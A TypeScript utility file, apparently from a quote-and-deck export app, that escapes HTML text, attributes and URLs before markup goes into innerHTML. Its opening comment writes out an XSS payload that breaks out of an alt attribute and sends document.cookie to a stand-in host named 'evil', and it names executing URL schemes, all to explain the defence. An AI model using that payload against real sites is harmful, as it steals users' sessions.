// HTML escaping for the places this app builds markup by hand.
//
// In ordinary JSX React escapes for you — {value} is always text. The danger is
// exclusively in the export paths (quote.ts, deck.ts, richText.tsx), which
// assemble HTML strings and assign them to innerHTML so html2canvas can
// rasterize them. Text there comes from the database: a brand name, a slide
// title, a caption typed over WhatsApp by whoever the bot was talking to.
//
// ⚠️ The escape MUST cover quotes, not just angle brackets. These strings are
// interpolated into ATTRIBUTES (`alt="${...}"`), and a value containing a
// double quote closes the attribute early — at which point
//     " onerror="fetch('https://evil/'+document.cookie)
// is markup, not text, running in the admin's session.

const ENTITIES: Record<string, string> = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
};

/** Escape a value for use as HTML text OR inside a quoted attribute. */
export function escapeHtml(value: unknown): string {
  if (value === null || value === undefined) return '';
  return String(value).replace(/[&<>"']/g, (c) => ENTITIES[c]);
}

/**
 * Escape, then reintroduce <br> for newlines — in that order, so the <br> this
 * function adds is the only tag that survives. Escaping after would neutralise
 * it; adding it before would let a payload smuggle its own tags through.
 */
export function escapeMultiline(value: unknown): string {
  return escapeHtml(value).replace(/\n/g, '<br>');
}

/**
 * URLs that will land in a src/href attribute. Attribute escaping alone is not
 * enough here — `javascript:` and `data:text/html` execute without needing a
 * single special character. Only the schemes these exports actually produce
 * (https, blob, and locally generated data:image) are allowed through.
 */
export function safeUrlAttribute(value: unknown): string {
  const url = String(value ?? '').trim();
  if (!url) return '';
  if (/^https:\/\//i.test(url)) return escapeHtml(url);
  if (/^blob:/i.test(url)) return escapeHtml(url);
  if (/^data:image\/(png|jpe?g|gif|webp|svg\+xml);base64,/i.test(url)) return escapeHtml(url);
  return '';
}
